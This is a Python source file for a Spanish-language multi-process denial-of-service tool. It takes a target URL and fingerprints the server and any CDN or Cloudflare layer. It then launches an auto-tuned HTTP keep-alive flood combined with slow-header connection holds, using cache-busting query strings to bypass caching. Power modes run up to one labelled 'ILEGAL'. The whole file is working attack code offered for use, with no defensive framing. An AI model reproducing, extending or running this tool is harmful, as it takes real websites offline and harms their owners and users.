#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=====================================================================
        M O T O R   D O S   -   M U L T I - C O R E   
=====================================================================
   By Richard Hill
=====================================================================
   POTENCIA Y CARACTERISTICAS:
    - Multiprocesamiento: reparte el ataque entre TODOS los nucleos
    - Asincronia total: DNS no bloqueante y handshake TLS en el loop
    - Excepciones especificas de red/socket (control de errores preciso)
    - Reconocimiento previo y auto-ajuste del ataque
    - HTTP FLOOD keep-alive + SLOW HOLD combinados
    - Y una POLLA
=====================================================================
"""

import argparse
import asyncio
import multiprocessing as mp
import os
import re
import shutil
import socket
import ssl
import sys
import threading
import time
from urllib.parse import urlparse, urljoin


# ----------------------------------------------------------------------
#  TERMINAL / COLORES
# ----------------------------------------------------------------------
class C:
    RESET = "\033[0m"
    RED   = "\033[31m"
    LRED  = "\033[91m"
    BRED  = "\033[1;91m"
    DRED  = "\033[38;5;88m"
    WHITE = "\033[97m"
    GREY  = "\033[90m"
    GREEN = "\033[92m"
    YEL   = "\033[93m"


_VT_OK = False


def enable_windows_ansi():
    global _VT_OK
    if os.name == "nt":
        try:
            import ctypes
            k = ctypes.windll.kernel32
            _VT_OK = bool(k.SetConsoleMode(k.GetStdHandle(-11), 7))
        except Exception:
            _VT_OK = False
    else:
        _VT_OK = True


def raise_fd_limit():
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = min(hard, 65535) if hard != -1 else 65535
        if soft < target:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
    except Exception:
        pass


enable_windows_ansi()
raise_fd_limit()

ANSI_RE = re.compile(r"\033\[[0-9;]*m")


def term_size():
    try:
        s = shutil.get_terminal_size((100, 30))
        return s.columns, s.lines
    except Exception:
        return 100, 30


def vlen(s):
    return len(ANSI_RE.sub("", s))


def truncate(s, n):
    out, vis, i = [], 0, 0
    while i < len(s) and vis < n:
        if s[i] == "\033":
            j = s.find("m", i)
            if j == -1:
                j = len(s) - 1
            out.append(s[i:j + 1])
            i = j + 1
            continue
        out.append(s[i])
        vis += 1
        i += 1
    return "".join(out)


def pad(s, n):
    s = truncate(s, n)
    return s + " " * max(0, n - vlen(s))


def center(s, n):
    s = truncate(s, n)
    space = max(0, n - vlen(s))
    left = space // 2
    return " " * left + s + " " * (space - left)


def clear():
    """Limpiado REAL de terminal (pantalla + scrollback)."""
    if os.name == "nt" and not _VT_OK:
        os.system("cls")
    else:
        sys.stdout.write("\033[H\033[2J\033[3J")
        sys.stdout.flush()


def home():
    """Redibujado sin parpadeo (cursor a inicio + borrar resto)."""
    sys.stdout.write("\033[H")
    sys.stdout.flush()


def p_ok(m):   print(C.LRED + "[+] " + C.WHITE + m + C.RESET)
def p_err(m):  print(C.BRED + "[x] " + C.WHITE + m + C.RESET)
def p_warn(m): print(C.BRED + "[!] " + C.WHITE + m + C.RESET)


# ----------------------------------------------------------------------
#  ARTE DE PORTADA
# ----------------------------------------------------------------------
ART = r"""
⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⡤⢤⣤⣤⣤⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡿⣟⠯⡒⢯⣽⣓⣒⢾⣯⣭⣿⣿⠿⠭⠭⣯⣷⣦⡀⠀⠀⠀
⠀⠀⠀⠀⣰⣿⣯⣞⣕⣽⠾⠿⠿⠿⢿⣏⣿⣿⣿⡗⣽⣿⣿⣷⡝⣿⣿⡆⠀⠀
⠀⠀⠀⣀⣛⠛⢿⣛⢝⢁⣀⣀⣀⠓⠶⠈⣿⣿⡿⠗⠉⠁⢀⣀⣹⣛⣛⣳⢄⠀
⠀⡔⡾⢁⣴⡆⢦⣬⣙⣛⣋⣤⣿⣿⣷⣾⣿⣿⣿⡆⢿⣿⡟⠻⠛⡉⣍⣲⢱⠁
⠀⣇⣇⢸⣉⡀⢦⣌⡙⠻⠿⣯⣭⣥⠡⡤⠿⢿⣿⣿⡆⠉⡻⢿⣿⠇⢻⣟⠼⠀
⠀⠈⠪⣴⣿⣧⡀⢉⠛⠘⢶⣦⣬⠉⣀⠓⠿⠿⠯⢉⣴⠿⠿⠓⡁⡄⠀⣿⠃⠀
⠀⠀⠀⠙⣿⣿⣷⣌⠻⢠⣤⣀⠉⠐⠛⠿⠿⠰⠶⠦⠰⠶⠇⠘⠃⠁⠀⣿⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣷⣌⠻⢿⠇⣼⣶⣦⡄⣄⣀⡀⢀⡀⢀⡀⡀⠀⢠⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠯⣛⠭⣻⠶⣬⣉⣛⠛⠃⠿⠿⠃⠿⠃⠚⣀⣁⣤⣾⣿⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠯⣶⣋⡽⢛⣿⣯⣿⣭⣭⡿⢿⣿⣻⣾⢟⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⣶⣾⣿⣿⣿⣭⣭⣭⣶⣿⡿⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠋⠁⠀⠀⠀
"""


def print_art(force=False):
    """Muestra el arte centrado segun el ancho; compacto si la terminal es baja."""
    tw, th = term_size()
    if th < 22 and not force:
        cred = "MOTOR DOS  -  >> By Richard Hill <<"
        print(C.LRED + center(cred, tw) + C.RESET)
        print(C.BRED + "=" * min(tw, 100) + C.RESET)
        return

    art_lines = ART.strip("\n").split("\n")
    art_w = max((vlen(l) for l in art_lines), default=0)
    left = max(0, (tw - art_w) // 2)
    for l in art_lines:
        print(" " * left + C.BRED + l + C.RESET)

    cred = ">>  By Richard Hill  <<"
    print(" " * max(0, (tw - len(cred)) // 2) + C.LRED + cred + C.RESET)
    subtitle = "MOTOR DOS  - (recon | asyncio | multiproceso)"
    print(" " * max(0, (tw - len(subtitle)) // 2) + C.DRED + subtitle + C.RESET)


# ----------------------------------------------------------------------
#  MARCO ADAPTABLE
# ----------------------------------------------------------------------
BOX_TL, BOX_TR, BOX_BL, BOX_BR = "╔", "╗", "╚", "╝"
BOX_H, BOX_V = "═", "║"
BOX_ML, BOX_MR = "╠", "╣"


def frame(title, body, footer, min_w=54, max_w=110):
    tw, th = term_size()
    w = max(min_w, min(tw - 2, max_w))
    inner = w - 4
    out = []
    out.append(C.BRED + BOX_TL + BOX_H * (w - 2) + BOX_TR + C.RESET)
    out.append(C.BRED + BOX_V + " " + C.LRED + center(title, inner) + C.BRED + " " + BOX_V + C.RESET)
    out.append(C.BRED + BOX_ML + BOX_H * (w - 2) + BOX_MR + C.RESET)
    for line in body:
        out.append(C.BRED + BOX_V + " " + C.RESET + pad(line, inner) + C.BRED + " " + BOX_V + C.RESET)
    out.append(C.BRED + BOX_ML + BOX_H * (w - 2) + BOX_MR + C.RESET)
    out.append(C.BRED + BOX_V + " " + C.RESET + pad(footer, inner) + C.BRED + " " + BOX_V + C.RESET)
    out.append(C.BRED + BOX_BL + BOX_H * (w - 2) + BOX_BR + C.RESET)
    return out, w, inner


def kv_line(label, value, inner, label_w=22):
    if inner >= label_w + 14:
        return [f"{C.RED}{label:<{label_w}}{C.RESET}: {C.WHITE}{value}{C.RESET}"]
    return [f"{C.RED}{label}{C.RESET}", f"   {C.WHITE}{value}{C.RESET}"]


def kv_block(rows, inner, label_w=22):
    lines = []
    for label, value in rows:
        lines.extend(kv_line(label, value, inner, label_w))
    return lines


# ----------------------------------------------------------------------
#  CONFIGURACION
# ----------------------------------------------------------------------
class Config:
    def __init__(self):
        self.host         = None
        self.ip           = None
        self.port         = 80
        self.path         = "/"
        self.https        = False
        self.conns        = 2000
        self.procs        = max(1, min(os.cpu_count() or 1, 8))
        self.flood_ratio  = 1.0
        self.mode_name    = "BRUTAL"
        self.read_timeout = 5.0
        self.slow_interval = 10.0
        self.cache_bust   = True
        self.compress     = True

    def target_url(self):
        return f"{'https' if self.https else 'http'}://{self.host}:{self.port}{self.path}"

    def as_dict(self):
        return dict(self.__dict__)


CFG = Config()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",
]


# ----------------------------------------------------------------------
#  ESTADISTICAS
# ----------------------------------------------------------------------
class Counters:
    def __init__(self):
        self.requests = 0
        self.errors   = 0
        self.conns    = 0
        self.bytes    = 0
        self.timeouts = 0


LOCAL = Counters()
AGG = Counters()


# ----------------------------------------------------------------------
#  RESOLUCION ASINCRONA
# ----------------------------------------------------------------------
async def resolve_async(host, port):
    loop = asyncio.get_running_loop()
    infos = await loop.getaddrinfo(host, port, type=socket.SOCK_STREAM)
    return infos[0][4][0]


# ----------------------------------------------------------------------
#  RECONOCIMIENTO
# ----------------------------------------------------------------------
async def _fetch(method, path, ip, timeout=8):
    kw = {}
    if CFG.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        kw["ssl"] = ctx
        kw["server_hostname"] = CFG.host
    t0 = time.time()
    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(ip, CFG.port, **kw), timeout=timeout)
    req = (f"{method} {path} HTTP/1.1\r\n"
           f"Host: {CFG.host}\r\n"
           f"User-Agent: Mozilla/5.0\r\n"
           f"Accept: */*\r\n"
           f"Accept-Encoding: gzip, deflate\r\n"
           f"Connection: close\r\n\r\n").encode()
    writer.write(req)
    await writer.drain()
    try:
        data = await asyncio.wait_for(reader.read(65536), timeout=timeout)
    except asyncio.TimeoutError:
        data = b""
    lat = (time.time() - t0) * 1000
    writer.close()
    return data, lat


def _parse(data):
    if not data:
        return None, {}
    head = data.split(b"\r\n\r\n", 1)[0].decode("latin-1", errors="ignore")
    lines = head.split("\r\n")
    status = lines[0] if lines else ""
    headers = {}
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return status, headers


async def _tls_info(ip):
    loop = asyncio.get_running_loop()
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        raw = await loop.run_in_executor(None, lambda: socket.create_connection((ip, CFG.port), 8))
        s = ctx.wrap_socket(raw, server_hostname=CFG.host)
        info = {"version": s.version(), "cipher": (s.cipher() or ("?",))[0]}
        s.close()
        return info
    except Exception:
        return {}


async def recon(ip):
    info = {"status": None, "server": "", "powered": "", "cf": False, "cdn": "",
            "via": "", "cache": "", "encoding": "", "cookies": False,
            "http_ver": "1.1", "latency_ms": 0, "tls": {}, "hsts": False,
            "redirect": None, "alive": False}
    if CFG.https:
        info["tls"] = await _tls_info(ip)
    try:
        data, lat = await _fetch("GET", CFG.path, ip)
    except (OSError, asyncio.TimeoutError, ssl.SSLError):
        return info

    info["alive"] = bool(data)
    info["latency_ms"] = lat
    status, h = _parse(data)
    if status:
        info["status"] = status.split(" ")[1] if " " in status else status
        info["http_ver"] = status.split("/")[1].split(" ")[0] if "/" in status else "1.1"
    info["server"] = h.get("server", "")
    info["powered"] = h.get("x-powered-by", "")
    info["via"] = h.get("via", "")
    info["cache"] = h.get("x-cache", "") or h.get("cf-cache-status", "")
    info["encoding"] = h.get("content-encoding", "")
    info["cookies"] = "set-cookie" in h
    info["hsts"] = "strict-transport-security" in h
    if "cf-ray" in h or "cloudflare" in info["server"].lower():
        info["cf"] = True
    if info["via"] or "akamai" in info["server"].lower():
        info["cdn"] = info["via"] or "CDN"

    loc = h.get("location")
    if loc and info["status"] in ("301", "302", "303", "307", "308"):
        info["redirect"] = loc
        try:
            u = urlparse(urljoin(CFG.target_url(), loc))
            if u.hostname == CFG.host:
                CFG.path = u.path or "/"
                if u.query:
                    CFG.path += "?" + u.query
        except ValueError:
            pass

    lats = [info["latency_ms"]]
    for _ in range(2):
        try:
            _, l = await _fetch("HEAD", CFG.path, ip)
            lats.append(l)
        except (OSError, asyncio.TimeoutError, ssl.SSLError):
            pass
    info["latency_ms"] = sum(lats) / len(lats)
    return info


# ----------------------------------------------------------------------
#  ANALISIS + AUTO-AJUSTE
# ----------------------------------------------------------------------
def analyze(a):
    srv = (a.get("server") or "").lower()
    weak, notes = [], []
    lethal = 55

    if not a.get("alive"):
        notes.append("Sin respuesta inicial: subiendo timeout de reconexion")
        CFG.read_timeout = 8.0
        return lethal, weak, notes, "FLOOD PURO"

    if a.get("cf"):
        notes.append("Cloudflare detectado: cache-buster ON y +30% conexiones")
        CFG.cache_bust = True
        CFG.conns = int(CFG.conns * 1.3)
        weak.append("Cache-buster impide servir desde cache de Cloudflare")
        lethal -= 12
    elif a.get("cdn"):
        notes.append(f"CDN detectada ({a['cdn']}): apuntando al origen")
        CFG.cache_bust = True
        lethal -= 8

    if "apache" in srv:
        notes.append("Apache: mezcla flood+hold (se satura con conexiones retenidas)")
        CFG.flood_ratio = 0.55
        weak.append("Apache: pool de workers limitado, el hold lo agota")
        lethal += 14
    elif "nginx" in srv:
        notes.append("nginx: flood dominante a maxima velocidad")
        CFG.flood_ratio = 1.0
        lethal += 6
    elif "iis" in srv or "microsoft" in srv:
        notes.append("IIS: hold agresivo")
        CFG.flood_ratio = 0.5
        lethal += 10

    if a.get("powered"):
        weak.append(f"Tecnologia expuesta: {a['powered']}")
        lethal += 3

    lat = a.get("latency_ms", 0)
    if lat > 600:
        notes.append(f"Latencia alta ({lat:.0f}ms): +conexiones para saturar el accept queue")
        CFG.conns = int(CFG.conns * 1.2)
        CFG.read_timeout = max(CFG.read_timeout, 8.0)
        lethal += 10
    elif lat < 90:
        notes.append(f"Latencia baja ({lat:.0f}ms): flood puro")
        lethal += 4

    if a.get("cookies"):
        notes.append("Cookies de sesion detectadas")
        lethal += 3
    if a.get("encoding"):
        notes.append(f"Compresion activa ({a['encoding']}): forzamos CPU por peticion")
        lethal += 5
    if a.get("tls"):
        weak.append(f"TLS {a['tls'].get('version','?')} (carga de handshake)")

    lethal = max(5, min(99, lethal))
    vector = "FLOOD + HOLD (hibrido)" if CFG.flood_ratio < 0.8 else "HTTP FLOOD keep-alive"
    return lethal, weak, notes, vector


# ----------------------------------------------------------------------
#  MOTOR ASINCRONO (por proceso)
# ----------------------------------------------------------------------
STOP_EV = None
SSL_CTX = None


def build_request():
    path = CFG.path
    if CFG.cache_bust:
        sep = "&" if "?" in path else "?"
        path = f"{path}{sep}r={int(time.time()*1000)%100000}{os.getpid()%97}"
    enc = "gzip, deflate" if CFG.compress else "identity"
    return (f"GET {path} HTTP/1.1\r\n"
            f"Host: {CFG.host}\r\n"
            f"User-Agent: {USER_AGENTS[0]}\r\n"
            f"Accept: */*\r\n"
            f"Accept-Encoding: {enc}\r\n"
            f"Connection: keep-alive\r\n\r\n").encode()


def build_slow_head():
    sep = "&" if "?" in CFG.path else "?"
    path = f"{CFG.path}{sep}r={int(time.time()*1000)%100000}"
    return (f"GET {path} HTTP/1.1\r\n"
            f"Host: {CFG.host}\r\n"
            f"User-Agent: {USER_AGENTS[0]}\r\n"
            f"Accept: */*\r\n").encode()


async def open_conn(ip):
    kw = {}
    if CFG.https:
        kw["ssl"] = SSL_CTX
        kw["server_hostname"] = CFG.host
    return await asyncio.wait_for(asyncio.open_connection(ip, CFG.port, **kw), timeout=10)


async def flood_loop(reader, writer):
    while not STOP_EV.is_set():
        writer.write(build_request())
        await writer.drain()
        LOCAL.requests += 1
        try:
            data = await asyncio.wait_for(reader.read(65536), timeout=CFG.read_timeout)
        except asyncio.TimeoutError:
            LOCAL.timeouts += 1
            return
        if not data:
            return
        LOCAL.bytes += len(data)


async def slow_loop(reader, writer):
    writer.write(build_slow_head())
    await writer.drain()
    while not STOP_EV.is_set():
        await asyncio.sleep(CFG.slow_interval + random_frac())
        if STOP_EV.is_set():
            return
        writer.write(f"X-{int(time.time()*1000)%99999}: {os.getpid()}\r\n".encode())
        try:
            await writer.drain()
        except (ConnectionResetError, BrokenPipeError, OSError):
            return


def random_frac():
    return (int(time.time() * 1000) % 1000) / 1000.0


async def worker(idx, ip):
    use_flood = (idx % 100) < int(CFG.flood_ratio * 100)
    while not STOP_EV.is_set():
        writer = None
        try:
            reader, writer = await open_conn(ip)
        except (ConnectionRefusedError, ConnectionResetError, asyncio.TimeoutError,
                ssl.SSLError, socket.gaierror, OSError):
            LOCAL.errors += 1
            await asyncio.sleep(0.05)
            continue
        LOCAL.conns += 1
        try:
            sock = writer.get_extra_info("socket")
            if sock is not None:
                try:
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
            if use_flood:
                await flood_loop(reader, writer)
            else:
                await slow_loop(reader, writer)
        except (ConnectionResetError, BrokenPipeError, asyncio.TimeoutError, OSError):
            LOCAL.errors += 1
        finally:
            LOCAL.conns -= 1
            try:
                writer.close()
            except Exception:
                pass


async def reporter(q):
    last = (LOCAL.requests, LOCAL.errors, LOCAL.bytes, LOCAL.timeouts)
    while not STOP_EV.is_set():
        await asyncio.sleep(0.5)
        cur = (LOCAL.requests, LOCAL.errors, LOCAL.bytes, LOCAL.timeouts)
        q.put(((cur[0] - last[0], cur[1] - last[1], cur[2] - last[2], cur[3] - last[3]),
               LOCAL.conns))
        last = cur


async def child_attack(conns, q):
    global SSL_CTX
    if CFG.https:
        SSL_CTX = ssl.create_default_context()
        SSL_CTX.check_hostname = False
        SSL_CTX.verify_mode = ssl.CERT_NONE
    ip = CFG.ip
    tasks = [asyncio.create_task(worker(i, ip)) for i in range(conns)]
    tasks.append(asyncio.create_task(reporter(q)))
    await asyncio.gather(*tasks)


def child_main(cfg_dict, conns, q, stop_ev):
    global STOP_EV
    STOP_EV = stop_ev
    for k, v in cfg_dict.items():
        setattr(CFG, k, v)
    try:
        asyncio.run(child_attack(conns, q))
    except KeyboardInterrupt:
        pass


# ----------------------------------------------------------------------
#  PANEL EN VIVO (padre)
# ----------------------------------------------------------------------
def build_dashboard(rps, avg, vector, elapsed, procs_alive):
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    tw, th = term_size()

    body = []
    body += kv_block([
        ("Objetivo", CFG.target_url()),
        ("IP destino", CFG.ip or "-"),
        ("Modo / Nucleos", f"{CFG.mode_name}  /  {procs_alive} procesos"),
        ("Vector", vector),
        ("Tiempo", f"{h:02d}:{m:02d}:{s:02d}"),
    ], 100)
    body.append(C.BRED + "-" * max(10, min(tw - 6, 104)) + C.RESET)
    body += kv_block([
        ("Conexiones", f"{AGG.conns} / {CFG.conns}"),
        ("Peticiones", f"{AGG.requests:,}"),
        ("Velocidad", f"{rps:,.0f} req/s   (media {avg:,.0f} req/s)"),
        ("Trafico", f"{AGG.bytes/1e6:.1f} MB"),
        ("Errores", f"{AGG.errors}   timeouts {AGG.timeouts}"),
    ], 100)

    bar_len = max(20, min(tw - 12, 60))
    filled = int(bar_len * min(rps / 5000.0, 1.0)) if rps else 0
    body.append("")
    body.append(C.BRED + "[" + C.LRED + "#" * filled + C.GREY +
                "-" * (bar_len - filled) + C.BRED + "]" + C.RESET)

    footer = C.LRED + ">> By Richard Hill <<" + C.RESET + C.GREY + "     Ctrl+C para detener" + C.RESET
    return frame("M O T O R   D D O S   -   M U L T I - C O R E", body, footer)


def draw_dashboard(rps, avg, vector, elapsed, procs_alive):
    lines, w, inner = build_dashboard(rps, avg, vector, elapsed, procs_alive)
    home()
    sys.stdout.write("\n".join(lines) + "\033[J\n")
    sys.stdout.flush()


# ----------------------------------------------------------------------
#  ORQUESTADOR MULTIPROCESO
# ----------------------------------------------------------------------
def orchestrate(vector):
    global AGG
    AGG = Counters()
    q = mp.Queue()
    stop_ev = mp.Event()

    per = max(1, CFG.conns // CFG.procs)
    real_total = per * CFG.procs
    procs = [mp.Process(target=child_main, args=(CFG.as_dict(), per, q, stop_ev),
                        daemon=True) for _ in range(CFG.procs)]
    for p in procs:
        p.start()

    start = time.time()
    last_req, last_t = 0, time.time()
    try:
        while any(p.is_alive() for p in procs):
            while True:
                try:
                    (dreq, derr, dbytes, dtout), cconns = q.get_nowait()
                except Exception:
                    break
                AGG.requests += dreq
                AGG.errors += derr
                AGG.bytes += dbytes
                AGG.timeouts += dtout
                AGG.conns = cconns
            AGG.conns = min(AGG.conns if AGG.conns else 0, real_total)

            now = time.time()
            dt = max(now - last_t, 1e-6)
            rps = (AGG.requests - last_req) / dt
            last_req, last_t = AGG.requests, now
            elapsed = int(now - start)
            avg = AGG.requests / max(now - start, 1e-6)
            alive = sum(1 for p in procs if p.is_alive())
            draw_dashboard(rps, avg, vector, elapsed, alive)
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_ev.set()
        for p in procs:
            p.join(timeout=5)
        for p in procs:
            if p.is_alive():
                p.terminate()
        elapsed = int(time.time() - start)
        avg = AGG.requests / max(elapsed, 1)
        clear()
        body = kv_block([
            ("Duracion", f"{elapsed} s"),
            ("Peticiones", f"{AGG.requests:,}"),
            ("Media", f"{avg:,.0f} req/s"),
            ("Trafico", f"{AGG.bytes/1e6:.1f} MB"),
            ("Errores", f"{AGG.errors}"),
        ], 100)
        lines, _, _ = frame("ATAQUE FINALIZADO", body,
                            C.LRED + ">> By Richard Hill <<" + C.RESET)
        print("\n".join(lines))


# ----------------------------------------------------------------------
#  PRESENTACION
# ----------------------------------------------------------------------
def show_analysis(a, lethal, weak, notes, vector):
    tw, th = term_size()
    body = kv_block([
        ("Estado", "VIVO" if a.get("alive") else "SIN RESPUESTA"),
        ("Codigo HTTP", a.get("status") or "-"),
        ("Servidor", a.get("server") or "oculto"),
        ("Tecnologia", a.get("powered") or "oculta"),
        ("CDN / WAF", ("Cloudflare" if a.get("cf") else a.get("cdn")) or "no detectada"),
        ("Version HTTP", a.get("http_ver") or "1.1"),
        ("Latencia media", f"{a.get('latency_ms', 0):.0f} ms"),
        ("Compresion", a.get("encoding") or "ninguna"),
        ("Cookies", "si" if a.get("cookies") else "no"),
    ], 100)
    bar_len = 30
    filled = int(lethal / 100 * bar_len)
    col = C.GREEN if lethal >= 75 else C.YEL if lethal >= 50 else C.BRED
    body.append("")
    body.append(f"{C.RED}INDICE DE LETALIDAD{C.RESET}: {col}{lethal}%{C.RESET} "
                f"{col}[{'#'*filled}{'-'*(bar_len-filled)}]{C.RESET}")
    if weak:
        body.append("")
        body.append(C.LRED + "PUNTOS DEBILES" + C.RESET)
        for w in weak:
            body.append(f"{C.BRED}* {C.WHITE}{w}{C.RESET}")
    if notes:
        body.append("")
        body.append(C.LRED + "AJUSTES AUTOMATICOS" + C.RESET)
        for n in notes:
            body.append(f"{C.LRED}-> {C.WHITE}{n}{C.RESET}")
    lines, _, _ = frame("RECONOCIMIENTO DEL OBJETIVO", body,
                        C.LRED + ">> By Richard Hill <<" + C.RESET)
    print("\n".join(lines))


def show_plan(vector):
    body = kv_block([
        ("Objetivo", CFG.target_url()),
        ("IP destino", CFG.ip or "-"),
        ("Modo", CFG.mode_name),
        ("Nucleos usados", CFG.procs),
        ("Vector", vector),
        ("Conexiones totales", CFG.conns),
        ("Flood / Hold", f"{int(CFG.flood_ratio*100)}% / {int((1-CFG.flood_ratio)*100)}%"),
        ("Cache-buster", "ON" if CFG.cache_bust else "OFF"),
    ], 100)
    lines, _, _ = frame("PLAN DE ATAQUE FINAL", body,
                        C.LRED + ">> By Richard Hill <<" + C.RESET)
    print("\n".join(lines))


def spinner(stop_ev, text):
    frames = "|/-\\"
    i = 0
    while not stop_ev.is_set():
        sys.stdout.write(f"\r{C.LRED}  {frames[i % 4]} {C.WHITE}{text}{C.RESET}   ")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write("\r" + " " * 70 + "\r")


# ----------------------------------------------------------------------
#  FLUJO
# ----------------------------------------------------------------------
MODOS = {"1": ("SUAVE", 300), "2": ("NORMAL", 800), "3": ("BRUTAL", 2000), "4": ("ILEGAL", 4000)}


def run_recon():
    ev = threading.Event()
    t = threading.Thread(target=spinner, args=(ev, "Analizando objetivo..."), daemon=True)
    t.start()
    try:
        ip = asyncio.run(resolve_async(CFG.host, CFG.port))
        CFG.ip = ip
        a = asyncio.run(recon(ip))
    except (socket.gaierror, OSError) as e:
        a = {"alive": False, "error": str(e)}
    finally:
        ev.set()
        t.join()
    return a


def parse_target(target):
    target = target.strip()
    if "://" not in target:
        target = "http://" + target
    u = urlparse(target)
    CFG.host = u.hostname
    CFG.https = (u.scheme == "https")
    CFG.port = u.port if u.port else (443 if CFG.https else 80)
    CFG.path = u.path if u.path else "/"
    if u.query:
        CFG.path += "?" + u.query


def easy_flow():
    clear()
    print_art()
    print()
    intro = [
        f"{C.WHITE}Pega la URL del objetivo. Analizo y lanzo el ataque optimizado.{C.RESET}",
        "",
        f"{C.GREY}Modos base: 1 SUAVE(300) 2 NORMAL(800) 3 BRUTAL(2000) 4 ILEGAL(4000){C.RESET}",
    ]
    lines, _, _ = frame("A T A Q U E   G U I A D O", intro,
                        C.LRED + ">> By Richard Hill <<" + C.RESET)
    print("\n".join(lines))
    print()
    url = input(f"{C.LRED}  ? {C.WHITE}URL objetivo: {C.RESET}").strip()
    if not url:
        return
    try:
        parse_target(url)
    except ValueError:
        p_err("URL invalida.")
        time.sleep(1)
        return

    k = input(f"{C.LRED}  ? {C.WHITE}Modo base [3]: {C.RESET}").strip() or "3"
    CFG.mode_name, CFG.conns = MODOS.get(k, MODOS["3"])
    CFG.flood_ratio = 1.0

    print(C.GREY + f"\n   Nucleos detectados: {os.cpu_count()}   procesos a usar: {CFG.procs}" + C.RESET)

    a = run_recon()
    lethal, weak, notes, vector = analyze(a)

    clear()
    print_art()
    show_analysis(a, lethal, weak, notes, vector)
    show_plan(vector)
    print()
    ans = input(f"{C.BRED}  >> {C.WHITE}Confirmar y LANZAR? [S/n]: {C.RESET}").strip().lower()
    if ans in ("", "s", "si", "y", "yes"):
        orchestrate(vector)
    else:
        p_warn("Cancelado.")
        time.sleep(0.8)


def main_menu():
    while True:
        clear()
        print_art()
        print()
        menu_body = [
            f"{C.BRED}1{C.RESET}) {C.LRED}ATAQUE GUIADO{C.RESET}  {C.GREY}(analiza y lanza){C.RESET}",
            f"{C.BRED}2{C.RESET}) Modo de potencia   {C.GREY}(actual: {CFG.mode_name} / {CFG.conns}){C.RESET}",
            f"{C.BRED}3{C.RESET}) Nucleos a usar     {C.GREY}(actual: {CFG.procs} de {os.cpu_count()}){C.RESET}",
            f"{C.BRED}0{C.RESET}) Salir",
        ]
        lines, _, _ = frame("M O T O R   D D O S   -   M U L T I - C O R E", menu_body,
                            C.LRED + ">> By Richard Hill <<" + C.RESET)
        print("\n".join(lines))
        op = input(f"{C.LRED}  >> {C.WHITE}Opcion [1]: {C.RESET}").strip() or "1"
        if op == "1":
            easy_flow()
        elif op == "2":
            k = input(f"{C.LRED}  ? {C.WHITE}Modo 1-4: {C.RESET}").strip()
            if k in MODOS:
                CFG.mode_name, CFG.conns = MODOS[k]
        elif op == "3":
            try:
                n = int(input(f"{C.LRED}  ? {C.WHITE}Procesos (1-{os.cpu_count()}): {C.RESET}").strip())
                CFG.procs = max(1, min(n, os.cpu_count()))
            except ValueError:
                pass
        elif op == "0":
            clear()
            print_art()
            print()
            p_ok("Saliendo... By Richard Hill")
            return
        else:
            p_warn("Opcion invalida.")
            time.sleep(0.5)


def main():
    if len(sys.argv) <= 1:
        main_menu()
        return

    ap = argparse.ArgumentParser(description="Motor DOS Multi-Core - By Richard Hill")
    ap.add_argument("host")
    ap.add_argument("-c", "--conns", type=int, default=2000)
    ap.add_argument("-j", "--procs", type=int, default=CFG.procs)
    ap.add_argument("--path", default="/")
    args = ap.parse_args()

    parse_target(args.host)
    CFG.conns = args.conns
    CFG.procs = max(1, min(args.procs, os.cpu_count()))
    CFG.path = args.path if args.path.startswith("/") else "/" + args.path
    CFG.mode_name = "PERSONALIZADO"

    clear()
    print_art()
    a = run_recon()
    lethal, weak, notes, vector = analyze(a)
    clear()
    print_art()
    show_analysis(a, lethal, weak, notes, vector)
    show_plan(vector)
    orchestrate(vector)


if __name__ == "__main__":
    mp.freeze_support()
    try:
        main()
    except KeyboardInterrupt:
        print()
        p_ok("Cerrado. By Richard Hill")